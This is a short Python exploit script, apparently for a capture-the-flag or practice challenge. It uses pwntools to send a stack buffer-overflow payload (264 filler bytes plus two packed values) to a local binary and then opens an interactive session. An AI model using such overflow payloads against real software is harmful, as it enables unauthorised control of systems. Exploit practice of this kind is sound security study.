# coding: utf-8
from pwn import *
p = process("./a.out")
p.recv()
payload = b"A"*264 + p32(0x1337) + p32(0x69696969)
p.sendline(payload)
p.interactive()
